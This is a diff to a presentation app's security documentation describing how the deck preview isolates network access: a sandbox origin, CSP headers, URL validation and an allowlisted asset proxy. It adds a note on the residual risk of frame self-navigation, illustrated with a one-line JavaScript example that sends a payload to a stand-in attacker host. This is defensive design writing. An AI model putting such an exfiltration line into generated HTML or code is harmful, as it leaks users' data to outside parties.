@@ -88,12 +88,13 @@ When creating or editing deck HTML (through the agent tools or upload):
 
 ### Preview network isolation
 
-Deck preview blocks all network access from generated or uploaded HTML:
+Deck preview blocks external **fetches and resource loads** from generated or uploaded HTML (scripts, stylesheets, fonts, images, XHR/fetch). Frame **self-navigation** is a residual platform risk in full-JS mode (see below).
 
 - **Sandbox host** — Main preview and Present mode load decks from a separate origin (default `http://localhost:5174`) using short-lived render tokens from `POST /api/preview-sessions`. The sandbox host applies strict CSP/COOP/CORP response headers and does not share app cookies or storage.
 - **CSP** — Ark injects `Content-Security-Policy` with `connect-src 'none'` and `default-src 'none'` into preview documents (HTTP headers on the sandbox host; meta tags in thumbnail `srcDoc` iframes). Inline styles/scripts are allowed; external scripts, stylesheets, fonts, and images are blocked at runtime.
 - **Validation** — `external_url` is a blocking error on upload, save, and generation. The preview chrome shows a clear banner when a loaded deck still contains external URLs.
 - **Asset proxy** — `GET /api/deck-assets?url=...` can fetch allowlisted remote assets server-side when `ARK_DECK_ASSET_ALLOWLIST` is set. With no allowlist (default), all proxied requests return 403.
+- **Frame self-navigation (full-JS residual risk)** — A sandboxed iframe may always navigate **itself** (e.g. `location.href = 'https://evil.example/?' + payload`). CSP cannot block navigations (`navigate-to` never shipped). The shell detects unexpected iframe `load` events after the initial sandbox render URL load, tears down the preview, stops parent→frame bridge/editor `postMessage`, and reports via `POST /api/runtime-errors`. The **initial** outbound navigation request cannot be prevented by the platform; containment is the mitigation.
 
 ### Preview JavaScript
 
